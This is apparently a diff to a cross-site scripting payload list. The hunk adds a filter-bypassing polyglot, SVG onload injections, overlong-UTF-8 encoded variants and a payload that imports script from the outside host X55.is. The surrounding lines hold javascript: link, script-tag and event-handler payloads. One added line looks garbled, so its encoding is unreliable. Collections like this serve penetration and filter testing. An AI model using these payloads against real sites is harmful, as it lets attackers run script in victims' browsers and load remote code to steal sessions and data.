@@ -6,6 +6,11 @@
 <a href="javascript:&#97;&#108;&#101;&#114;&#116;('XSS')">Click me</a>
 {"user":"<script>alert('XSS')</script>"}
 <script>setInterval('alert("XSS")', 3000);</script>
+/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e
+<Svg OnLoad=confirm(1)>
+%C0%BCSvg%C0%A0OnLoad%C0%BDconfirm%C0%A81%C0%A9%C0%BE
+<Svg OnLoad=import('//X55.is')>
+%C0%BCSvg%C0%A0OnLoad%C0%BDimport%C0%A8%C0%A7%C0%AF%C0%http://AFX55.is%C0%A7%C0%A9%C0%BE
 <div id="xss">Hover me!</div>
 <script>document.getElementById('xss').onmouseover=function(){this.innerHTML='<img src=x onerror=alert(1)>'}</script>
 <a href="javascript:alert(atob('WFNT'))">Click Me</a>
